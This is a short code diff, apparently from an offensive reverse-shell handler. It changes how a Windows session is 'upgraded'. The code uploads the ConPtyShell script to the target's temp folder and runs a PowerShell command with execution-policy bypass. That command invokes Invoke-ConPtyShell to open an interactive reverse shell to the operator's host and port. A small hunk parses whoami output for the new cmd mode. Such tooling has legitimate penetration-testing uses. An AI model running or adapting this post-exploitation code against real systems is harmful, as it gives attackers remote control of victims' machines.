@@ -1206,11 +1206,14 @@ class MainMenu(BetterCMD):
 		if session.OS == 'Unix':
 			session.upgrade()
 		else:
-			if session.subtype == 'psh':
-				conptyshell_path = session.upload(URLS['conptyshell'], remote_path=session.tmp)[0]
-				session.exec(f"iex(get-content {conptyshell_path} -raw); Invoke-ConPtyShell -RemoteIp {session._host} -RemotePort {session._port} -Rows 24 -Cols 80")
-			else:
-				logger.warning("Powershell session is needed")
+			conptyshell_path = session.upload(URLS['conptyshell'], remote_path=session.tmp)[0]
+			shell_type = 'cmd' if session.subtype == 'cmd' else 'powershell'
+			session.exec(
+				f"powershell -nop -ep bypass -c \"iex(get-content {conptyshell_path} -raw); "
+				f"Invoke-ConPtyShell -RemoteIp {session._host} "
+				f"-RemotePort {session._port} -Rows 24 -Cols 80 -CommandLine {shell_type}\"",
+				force_cmd=True, raw=True
+			)
 
 	def do_dir(self, ID):
 		"""
@@ -2319,6 +2322,8 @@ class Session:
 			response = self.exec("whoami", force_cmd=True, value=True)
 			if "\n" in response:
 				response = response.splitlines()[-1] # conptyshell
+			if '\x07' in response:
+				response = response.split('\x07')[-1] # conptyshell cmd
 
 		return response or ''
 
